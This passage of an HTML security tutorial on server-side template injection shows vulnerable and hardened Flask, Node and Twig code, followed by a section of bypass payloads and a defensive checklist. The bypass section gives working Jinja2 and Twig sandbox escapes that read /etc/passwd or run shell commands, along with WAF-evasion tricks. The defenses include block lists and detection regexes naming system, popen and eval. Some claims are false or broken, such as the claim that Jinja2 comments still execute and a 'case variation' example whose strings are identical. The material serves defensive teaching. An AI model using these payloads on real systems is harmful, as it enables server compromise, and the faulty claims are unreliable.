<span class="code-keyword">def</span> <span class="code-function">greet</span>():
    name = request.args.<span class="code-function">get</span>(<span class="code-string">'name'</span>, <span class="code-string">'Guest'</span>)
    
    <span class="code-comment"># DANGEROUS: User input in template string</span>
    template = <span class="code-string">f"Hello, </span>{name}<span class="code-string">!"</span>
    
    <span class="code-comment"># render_template_string processes template syntax</span>
    <span class="code-keyword">return</span> render_template_string(template)

<span class="code-comment"># Attack: /greet?name={{7*7}} → "Hello, 49!"</span>
<span class="code-comment"># Attack: /greet?name={{system('id')}} via sandbox escape</span></code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Secure Flask Implementation</span></div>
          <pre><code><span class="code-keyword">from</span> flask <span class="code-keyword">import</span> Flask, request, render_template
<span class="code-keyword">from</span> jinja2 <span class="code-keyword">import</span> Environment, select_autoescape, UndefinedError
<span class="code-keyword">import</span> re

app = Flask(__name__)

<span class="code-comment"># Configure Jinja2 with strict sandbox</span>
app.jinja_env.autoescape = <span class="code-keyword">True</span>
app.jinja_env.undefined = UndefinedError  <span class="code-comment"># Strict undefined variables</span>

<span class="code-keyword">class</span> <span class="code-function">SafeUndefined</span>:
    <span class="code-string">"""Returns empty string for any attribute access"""</span>
    <span class="code-keyword">def</span> <span class="code-function">__getattr__</span>(self, name):
        <span class="code-keyword">return</span> <span class="code-string">''</span>
    <span class="code-keyword">def</span> <span class="code-function">__iter__</span>(self):
        <span class="code-keyword">return</span> <span class="code-function">iter</span>([])
    <span class="code-keyword">def</span> <span class="code-function">__bool__</span>(self):
        <span class="code-keyword">return</span> <span class="code-keyword">False</span>

<span class="code-keyword">def</span> <span class="code-function">sanitize_input</span>(text):
    <span class="code-string">"""Remove template syntax and dangerous characters"""</span>
    <span class="code-keyword">if</span> <span class="code-keyword">not</span> <span class="code-function">isinstance</span>(text, str):
        <span class="code-keyword">return</span> <span class="code-string">''</span>
    
    <span class="code-comment"># Block template delimiters and Python special chars</span>
    dangerous = [<span class="code-string">'{{'</span>, <span class="code-string">'}}'</span>, <span class="code-string">'{%'</span>, <span class="code-string">'%}'</span>, <span class="code-string">'{# '</span>, <span class="code-string">'#}'</span>, 
                 <span class="code-string">'_'</span>, <span class="code-string">'['</span>, <span class="code-string">']'</span>, <span class="code-string">'('</span>, <span class="code-string">')'</span>, <span class="code-string">'.'</span>]
    
    <span class="code-keyword">for</span> char <span class="code-keyword">in</span> dangerous:
        text = text.<span class="code-function">replace</span>(char, <span class="code-string">''</span>)
    
    <span class="code-comment"># Limit length</span>
    <span class="code-keyword">return</span> text[:<span class="code-number">100</span>]

<span class="code-keyword">@app.route</span>(<span class="code-string">'/greet'</span>)
<span class="code-keyword">def</span> <span class="code-function">greet_secure</span>():
    raw_name = request.args.<span class="code-function">get</span>(<span class="code-string">'name'</span>, <span class="code-string">'Guest'</span>)
    name = <span class="code-function">sanitize_input</span>(raw_name)
    
    <span class="code-comment"># Use render_template with external file - NEVER render_template_string with user input</span>
    <span class="code-keyword">return</span> <span class="code-function">render_template</span>(<span class="code-string">'greeting.html'</span>, name=name)

<span class="code-comment"># greeting.html contains: Hello, {{ name }} - with autoescaping enabled</span></code></pre>
        </div>

        <h3 class="subsection-title">Lab 3: Node.js Handlebars/Mustache</h3>
        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Secure Node.js Implementation</span></div>
          <pre><code><span class="code-keyword">const</span> express = <span class="code-function">require</span>(<span class="code-string">'express'</span>);
<span class="code-keyword">const</span> handlebars = <span class="code-function">require</span>(<span class="code-string">'handlebars'</span>);
<span class="code-keyword">const</span> { body, validationResult } = <span class="code-function">require</span>(<span class="code-string">'express-validator'</span>);

<span class="code-keyword">const</span> app = <span class="code-function">express</span>();

<span class="code-comment">// Create isolated, restricted Handlebars environment</span>
<span class="code-keyword">const</span> secureHB = handlebars.<span class="code-function">create</span>({
    <span class="code-attr">strict</span>: <span class="code-keyword">true</span>,
    <span class="code-attr">noEscape</span>: <span class="code-keyword">false</span>,  <span class="code-comment">// Force HTML escaping</span>
    <span class="code-attr">knownHelpers</span>: {
        <span class="code-attr">if</span>: <span class="code-keyword">true</span>,
        <span class="code-attr">each</span>: <span class="code-keyword">true</span>
    },
    <span class="code-attr">knownHelpersOnly</span>: <span class="code-keyword">true</span>  <span class="code-comment">// Block unknown helpers</span>
});

<span class="code-comment">// Compile template ONCE, reuse with different contexts</span>
<span class="code-keyword">const</span> template = secureHB.<span class="code-function">compile</span>(<span class="code-string">'Hello, {{name}}'</span>);

<span class="code-keyword">function</span> <span class="code-function">sanitizeTemplateInput</span>(input) {
    <span class="code-keyword">if</span> (<span class="code-keyword">typeof</span> input !== <span class="code-string">'string'</span>) <span class="code-keyword">return</span> <span class="code-string">''</span>;
    
    <span class="code-comment">// Block Handlebars syntax and JavaScript</span>
    <span class="code-keyword">const</span> dangerous = [<span class="code-string">'{{'</span>, <span class="code-string">'}}'</span>, <span class="code-string">'{{{'</span>, <span class="code-string">'}}}'</span>, <span class="code-string">'../'</span>, <span class="code-string">'./'</span>, <span class="code-string">'this'</span>];
    <span class="code-keyword">let</span> clean = input;
    dangerous.<span class="code-function">forEach</span>(d => {
        clean = clean.<span class="code-function">split</span>(d).<span class="code-function">join</span>(<span class="code-string">''</span>);
    });
    
    <span class="code-keyword">return</span> clean.<span class="code-function">substring</span>(<span class="code-number">0</span>, <span class="code-number">100</span>);
}

app.<span class="code-function">get</span>(<span class="code-string">'/greet'</span>, 
    body(<span class="code-string">'name'</span>).<span class="code-function">isLength</span>({ <span class="code-attr">max</span>: <span class="code-number">100</span> }).<span class="code-function">trim</span>().<span class="code-function">escape</span>(),
    (req, res) => {
        <span class="code-keyword">const</span> errors = <span class="code-function">validationResult</span>(req);
        <span class="code-keyword">if</span> (!errors.<span class="code-function">isEmpty</span>()) {
            <span class="code-keyword">return</span> res.<span class="code-function">status</span>(<span class="code-number">400</span>).<span class="code-function">json</span>({ <span class="code-attr">errors</span>: errors.<span class="code-function">array</span>() });
        }
        
        <span class="code-keyword">const</span> name = <span class="code-function">sanitizeTemplateInput</span>(req.query.name || <span class="code-string">'Guest'</span>);
        
        <span class="code-comment">// Render with context - input is data only</span>
        res.<span class="code-function">send</span>(<span class="code-function">template</span>({ name }));
    }
);</code></pre>
        </div>
      </div>

      <div id="bypass" class="content-card">
        <h2 class="card-title"><i>🚧</i> SSTI Bypass Techniques</h2>

        <p class="text-content">
          Attackers employ sophisticated techniques to bypass input validation, WAF rules, and template engine
          sandboxes. Understanding these is essential for building robust defenses.
        </p>

        <h3 class="subsection-title">1. Filter Evasion & Encoding</h3>
        <p class="text-content">
          When basic filters block common syntax, attackers use encoding and alternative representations.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Encoding Bypasses</span></div>
          <pre><code><span class="code-comment">-- HTML entity encoding</span>
<span class="code-string">{{7*7}}</span> → <span class="code-string">&lbrace;&lbrace;7*7&rbrace;&rbrace;</span>  <span class="code-comment">(if decoded before template processing)</span>

<span class="code-comment">-- Unicode normalization</span>
<span class="code-string">{{7*7}}</span> → <span class="code-string">&#123;&#123;7*7&#125;&#125;</span>

<span class="code-comment">-- URL encoding (if input is URL-decoded)</span>
<span class="code-string">%7B%7B7*7%7D%7D</span>

<span class="code-comment">-- Null byte injection (legacy PHP)</span>
<span class="code-string">{{7*7%00}}</span>

<span class="code-comment">-- Case variation (if filter is case-sensitive)</span>
<span class="code-string">{{7*7}}</span> vs <span class="code-string">{{7*7}}</span> vs <span class="code-string">{{ 7 * 7 }}</span>

<span class="code-comment">-- Whitespace obfuscation</span>
<span class="code-string">{{ 7 * 7 }}</span>
<span class="code-string">{{7    *    7}}</span></code></pre>
        </div>

        <h3 class="subsection-title">2. Alternative Syntax & Context Injection</h3>
        <p class="text-content">
          Different template engines support multiple syntax variants. If one is blocked, others may work.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Alternative Syntax Payloads</span></div>
          <pre><code><span class="code-comment">-- Jinja2 comment syntax (executes code inside comments!)</span>
<span class="code-string">{# {{7*7}} #}</span>  <span class="code-comment">→ Still executes!</span>

<span class="code-comment">-- Expression statement extension</span>
<span class="code-string">{% do 7*7 %}</span>

<span class="code-comment">-- Line statements (if enabled)</span>
<span class="code-string"># for item in seq</span>
<span class="code-string">    {{ item }}</span>
<span class="code-string"># endfor</span>

<span class="code-comment">-- Twig alternative output</span>
<span class="code-string">{{ 7*7 }}</span>
<span class="code-string">{{ (7*7) }}</span>
<span class="code-string">{{ [7,7]|join|length }}</span>  <span class="code-comment">→ 2 (bypasses direct math detection)</span>

<span class="code-comment">-- Using backticks in PHP contexts</span>
<span class="code-string">{{ `id` }}</span>  <span class="code-comment">→ PHP shell_exec</span></code></pre>
        </div>

        <h3 class="subsection-title">3. Sandbox Escape via Object Inspection</h3>
        <p class="text-content">
          Even with restricted environments, Python/PHP introspection allows access to dangerous functionality.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Advanced Sandbox Escapes</span></div>
          <pre><code><span class="code-comment">-- Bypassing __class__ filter using |attr()</span>
{{ ()|attr('__class__') }}  <span class="code-comment">→ <class 'tuple'></span>

<span class="code-comment">-- Using request object (Flask)</span>
{{ request.__class__.__mro__[8].__subclasses__()[40]('/etc/passwd').read() }}

<span class="code-comment">-- Using g object (Flask global)</span>
{{ g.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}

<span class="code-comment">-- Using config object</span>
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

<span class="code-comment">-- Bypassing blacklist with unicode</span>
{{ request['\u005f\u005fclass\u005f\u005f'] }}  <span class="code-comment">→ __class__ in unicode</span>

<span class="code-comment">-- Using |map and |filter (Twig 2.10+)</span>
{{ ['id']|filter('system') }}
{{ ['cat /etc/passwd']|map('file_get_contents')|join }}

<span class="code-comment">-- Using |reduce</span>
{{ ['', 'system']|reduce('array_merge') }}  <span class="code-comment">→ complex chains</span></code></pre>
        </div>

        <h3 class="subsection-title">4. WAF Bypass Strategies</h3>
        <p class="text-content">
          Web Application Firewalls often use regex patterns that can be circumvented with creative payloads.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">WAF Evasion Techniques</span></div>
          <pre><code><span class="code-comment">-- Splitting keywords across multiple variables</span>
<span class="code-comment">-- Param 1: {{</span>
<span class="code-comment">-- Param 2: 7*7</span>
<span class="code-comment">-- Param 3: }}</span>
<span class="code-comment">-- Template: {{ param1 ~ param2 ~ param3 }}</span>

<span class="code-comment">-- Using string concatenation</span>
<span class="code-string">{{ '7'*2|int * '7'|int }}</span>

<span class="code-comment">-- Using chr() to build strings dynamically</span>
<span class="code-string">{{ ''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['__builtins__']['chr'](95) }}</span>

<span class="code-comment">-- Using hex/octal representations</span>
<span class="code-string">{{ '\x5f\x5fclass\x5f\x5f' }}</span>  <span class="code-comment">→ __class__</span>

<span class="code-comment">-- Using reverse strings</span>
<span class="code-string">{{ 'ssalc__'[::-1] }}</span>  <span class="code-comment">→ __class__</span>

<span class="code-comment">-- Nested template injection</span>
<span class="code-string">{{ {{7*7}} }}</span>  <span class="code-comment">→ Some engines double-parse</span></code></pre>
        </div>
      </div>

      <div id="mitigation" class="content-card">
        <h2 class="card-title"><i>🛡️</i> SSTI Prevention Checklist: Defense in Depth</h2>

        <div class="highlight-box">
          <strong>Golden Rule:</strong> Never allow user input to become template syntax. User data should always be
          passed as context variables, never concatenated into template strings. Treat template engines as execution
          environments, not simple string formatters.
        </div>

        <h3 class="subsection-title">Layer 1: Architectural Prevention</h3>
        <p class="text-content">
          The most effective defense is architectural: separate template code from user data entirely.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Architecture Best Practices</span></div>
          <pre><code><span class="code-comment">-- ❌ NEVER: User input in template strings</span>
<span class="code-keyword">$template</span> = <span class="code-string">"Hello, $user_input"</span>;  <span class="code-comment">-- DANGEROUS</span>

<span class="code-comment">-- ✅ ALWAYS: Static templates with context variables</span>
<span class="code-comment">-- Template file: greeting.html</span>
<span class="code-comment">-- Hello, {{ name }}</span>

<span class="code-keyword">$twig</span>-><span class="code-function">render</span>(<span class="code-string">'greeting.html'</span>, [<span class="code-string">'name'</span> => <span class="code-keyword">$user_input</span>]);

<span class="code-comment">-- ✅ Use dedicated template files, never runtime compilation</span>
<span class="code-comment">-- ✅ Compile templates ahead-of-time in production</span>
<span class="code-comment">-- ✅ Store templates in read-only filesystem locations</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 2: Input Validation & Sanitization</h3>
        <p class="text-content">
          If user input must appear in templates (e.g., email templates), apply strict allowlist validation.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Strict Input Validation</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">class</span> <span class="code-function">TemplateInputValidator</span> {
    <span class="code-keyword">const</span> <span class="code-function">ALLOWED_CHARS</span> = <span class="code-string">'/^[a-zA-Z0-9\s\-_\.]+$/'</span>;
    
    <span class="code-keyword">public static function</span> <span class="code-function">validate</span>(<span class="code-keyword">$input</span>, <span class="code-keyword">$max_length</span> = <span class="code-number">100</span>) {
        <span class="code-keyword">if</span> (!<span class="code-function">is_string</span>(<span class="code-keyword">$input</span>)) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> \InvalidArgumentException(<span class="code-string">"Input must be string"</span>);
        }
        
        <span class="code-keyword">if</span> (<span class="code-function">strlen</span>(<span class="code-keyword">$input</span>) > <span class="code-keyword">$max_length</span>) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> \LengthException(<span class="code-string">"Input too long"</span>);
        }
        
        <span class="code-comment">// Block template syntax characters</span>
        <span class="code-keyword">$forbidden</span> = [<span class="code-string">'{'</span>, <span class="code-string">'}'</span>, <span class="code-string">'%'</span>, <span class="code-string">'$'</span>, <span class="code-string">'#'</span>, <span class="code-string">'`'</span>, <span class="code-string">'\\'</span>];
        <span class="code-keyword">foreach</span> (<span class="code-keyword">$forbidden</span> <span class="code-keyword">as</span> <span class="code-keyword">$char</span>) {
            <span class="code-keyword">if</span> (<span class="code-function">strpos</span>(<span class="code-keyword">$input</span>, <span class="code-keyword">$char</span>) !== <span class="code-keyword">false</span>) {
                <span class="code-keyword">throw</span> <span class="code-keyword">new</span> \SecurityException(<span class="code-string">"Forbidden character detected"</span>);
            }
        }
        
        <span class="code-comment">// Allowlist pattern</span>
        <span class="code-keyword">if</span> (!<span class="code-function">preg_match</span>(self::ALLOWED_CHARS, <span class="code-keyword">$input</span>)) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> \SecurityException(<span class="code-string">"Invalid characters in input"</span>);
        }
        
        <span class="code-keyword">return</span> <span class="code-function">htmlspecialchars</span>(<span class="code-keyword">$input</span>, <span class="code-function">ENT_QUOTES</span>, <span class="code-string">'UTF-8'</span>);
    }
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 3: Template Engine Sandboxing</h3>
        <p class="text-content">
          Configure template engines with strict sandbox policies that disable dangerous features.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Twig Sandbox Configuration</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">use</span> Twig\Environment;
<span class="code-keyword">use</span> Twig\Loader\ArrayLoader;
<span class="code-keyword">use</span> Twig\Sandbox\SecurityPolicy;
<span class="code-keyword">use</span> Twig\Sandbox\SecurityError;

<span class="code-comment">// Minimal allowed operations</span>
<span class="code-keyword">$allowed_tags</span> = [<span class="code-string">'if'</span>, <span class="code-string">'for'</span>, <span class="code-string">'set'</span>];
<span class="code-keyword">$allowed_filters</span> = [<span class="code-string">'escape'</span>, <span class="code-string">'e'</span>, <span class="code-string">'upper'</span>, <span class="code-string">'lower'</span>, <span class="code-string">'date'</span>];
<span class="code-keyword">$allowed_methods</span> = [];  <span class="code-comment">// No methods allowed on objects</span>
<span class="code-keyword">$allowed_properties</span> = [];  <span class="code-comment">// No property access</span>
<span class="code-keyword">$allowed_functions</span> = [<span class="code-string">'range'</span>, <span class="code-string">'cycle'</span>];

<span class="code-keyword">$policy</span> = <span class="code-keyword">new</span> SecurityPolicy(
    <span class="code-keyword">$allowed_tags</span>,
    <span class="code-keyword">$allowed_filters</span>,
    <span class="code-keyword">$allowed_methods</span>,
    <span class="code-keyword">$allowed_properties</span>,
    <span class="code-keyword">$allowed_functions</span>
);

<span class="code-keyword">$twig</span>-><span class="code-function">addExtension</span>(<span class="code-keyword">new</span> \Twig\Extension\SandboxExtension(<span class="code-keyword">$policy</span>, <span class="code-keyword">true</span>));

<span class="code-comment">// Disable auto-escaping bypass</span>
<span class="code-keyword">$twig</span>-><span class="code-function">getExtension</span>(\Twig\Extension\EscaperExtension::class)-><span class="code-function">setDefaultStrategy</span>(<span class="code-string">'html'</span>);

<span class="code-comment">// Disable dangerous functions</span>
<span class="code-keyword">$twig</span>-><span class="code-function">addFilter</span>(<span class="code-keyword">new</span> \Twig\TwigFilter(<span class="code-string">'raw'</span>, <span class="code-keyword">function</span>() {
    <span class="code-keyword">throw</span> <span class="code-keyword">new</span> \Exception(<span class="code-string">"Raw filter disabled"</span>);
}));
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Jinja2 Sandbox Configuration</span></div>
          <pre><code><span class="code-keyword">from</span> jinja2.sandbox <span class="code-keyword">import</span> SandboxedEnvironment
<span class="code-keyword">from</span> jinja2 <span class="code-keyword">import</span> select_autoescape

<span class="code-comment"># Use SandboxedEnvironment instead of regular Environment</span>
env = SandboxedEnvironment(
    autoescape=select_autoescape([<span class="code-string">'html'</span>, <span class="code-string">'xml'</span>]),
    enable_async=<span class="code-keyword">False</span>,
    undefined=UndefinedError
)

<span class="code-comment"># Remove dangerous globals</span>
env.globals.<span class="code-function">clear</span>()

<span class="code-comment"># Remove dangerous filters</span>
dangerous_filters = [<span class="code-string">'attr'</span>, <span class="code-string">'map'</span>, <span class="code-string">'select'</span>, <span class="code-string">'reject'</span>, 
                     <span class="code-string">'selectattr'</span>, <span class="code-string">'rejectattr'</span>, <span class="code-string">'map'</span>]
<span class="code-keyword">for</span> f <span class="code-keyword">in</span> dangerous_filters:
    env.filters.<span class="code-function">pop</span>(f, <span class="code-keyword">None</span>)

<span class="code-comment"># Compile template from safe source only</span>
template = env.<span class="code-function">from_string</span>(<span class="code-string">"Hello, {{ name }}"</span>)
result = template.<span class="code-function">render</span>(name=user_input)  <span class="code-comment"># Safe: user_input is context</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 4: Runtime Protections</h3>
        <p class="text-content">
          Implement additional runtime guards to detect and prevent template injection attempts.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Runtime Monitoring</span></div>
          <pre><code><span class="code-keyword">class</span> <span class="code-function">TemplateMonitor</span> {
    <span class="code-keyword">private</span> <span class="code-keyword">$forbidden_patterns</span> = [
        <span class="code-string">'/\{\{.*__.*\}\}/'</span>,      <span class="code-comment">// __class__, __mro__, etc.</span>
        <span class="code-string">'/\{\{.*system.*\}\}/'</span>,   <span class="code-comment">// system calls</span>
        <span class="code-string">'/\{\{.*popen.*\}\}/'</span>,    <span class="code-comment">// popen calls</span>
        <span class="code-string">'/\{\{.*eval.*\}\}/'</span>,     <span class="code-comment">// eval</span>
        <span class="code-string">'/\{\{.*import.*\}\}/'</span>,   <span class="code-comment">// imports</span>
    ];
    
    <span class="code-keyword">public function</span> <span class="code-function">auditTemplate</span>(<span class="code-keyword">$template</span>, <span class="code-keyword">$source</span>) {
        <span class="code-keyword">foreach</span> (<span class="code-keyword">$this</span>->forbidden_patterns <span class="code-keyword">as</span> <span class="code-keyword">$pattern</span>) {
            <span class="code-keyword">if</span> (<span class="code-function">preg_match</span>(<span class="code-keyword">$pattern</span>, <span class="code-keyword">$template</span>)) {
                <span class="code-keyword">$this</span>-><span class="code-function">alertSecurityTeam</span>(<span class="code-keyword">$source</span>, <span class="code-keyword">$template</span>);
                <span class="code-keyword">throw</span> <span class="code-keyword">new</span> SecurityException(<span class="code-string">"Potential SSTI detected"</span>);
            }
        }
    }
    
    <span class="code-keyword">private function</span> <span class="code-function">alertSecurityTeam</span>(<span class="code-keyword">$source</span>, <span class="code-keyword">$template</span>) {
        <span class="code-comment">// Log to SIEM, send alert, block IP</span>
        <span class="code-function">error_log</span>(<span class="code-string">"[SSTI ATTEMPT] Source: $source, Template: $template"</span>);
    }
}</code></pre>
        </div>

        <h3 class="subsection-title">Layer 5: Environment Hardening</h3>
        <p class="text-content">
          Harden the server environment to limit damage if SSTI occurs.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">System Hardening</span></div>
          <pre><code><span class="code-comment">-- Run application as non-privileged user</span>
<span class="code-keyword">useradd</span> -s /bin/false -M www-template

<span class="code-comment">-- Use chroot jail for template processing</span>
<span class="code-keyword">chroot</span> /var/www/template-jail /usr/bin/php-fpm

<span class="code-comment">-- AppArmor/SELinux profile to restrict file access</span>
<span class="code-keyword">profile</span> template-engine {
    <span class="code-keyword">/var/www/templates/</span> r,
    <span class="code-keyword">/tmp/</span> rw,
    <span class="code-keyword">deny</span> /etc/passwd r,
    <span class="code-keyword">deny</span> /proc/r,
    <span class="code-keyword">deny</span> /bin/sh x,
}

<span class="code-comment">-- Disable dangerous PHP functions</span>
<span class="code-keyword">disable_functions</span> = system, exec, passthru, shell_exec, proc_open, popen

<span class="code-comment">-- Read-only filesystem for templates</span>
<span class="code-keyword">mount</span> -o remount,ro /var/www/templates</code></pre>
        </div>

        <h3 class="subsection-title">Security Checklist Summary</h3>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Never concatenate user input into template strings</strong><br>
            Always pass user data as context variables to pre-defined templates
          </div>
        </div>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Use external template files</strong><br>
            Avoid runtime template compilation; load templates from read-only files
          </div>
        </div>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Enable strict sandbox mode</strong><br>
            Whitelist only necessary tags, filters, and functions; disable raw/escape bypass
          </div>
        </div>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Validate input with allowlists</strong><br>
            Block template syntax characters: { } % $ # ` and backslashes
          </div>
        </div>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Implement runtime monitoring</strong><br>
            Alert on template syntax in unexpected input fields; log all template compilation
          </div>
        </div>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Run with minimal privileges</strong><br>
            Use dedicated service accounts, chroot jails, and AppArmor/SELinux profiles
          </div>
        </div>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Keep template engines updated</strong><br>
            Patch known sandbox escape vulnerabilities; monitor CVEs for your engine
          </div>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: Implementing Defense in Depth for SSTI</div>
          <div class="diagram-placeholder">
            <i>▶️</i><br>
            [Insert Video: Complete SSTI protection implementation walkthrough]
          </div>
        </div>
      </div>

    </main>
  </div>

  <script>
  function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    sidebar.style.transform = sidebar.style.transform === 'translateX(0%)' ? 'translateX(-100%)' : 'translateX(0%)';
  }

  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
      e.preventDefault();
      const target = document.querySelector(this.getAttribute('href'));
      if (target) {
        target.scrollIntoView({
          behavior: 'smooth',
          block: 'start'
        });
      }
    });
  });

  function copyCode(btn) {
    const codeBlock = btn.closest('.code-block').querySelector('pre');
    const text = codeBlock.textContent;
    navigator.clipboard.writeText(text).then(() => {
      btn.textContent = '✅ Copied!';
      setTimeout(() => btn.textContent = '📋 Copy', 2000);
    });
  }
  </script>
  <?php if (!$isLoggedIn): ?>
  <script>
  window.addEventListener("load", function() {
    if (typeof LoginModal !== "undefined") {
      LoginModal.show();
    }
  });
  </script>
  <?php endif; ?>

</body>

</html>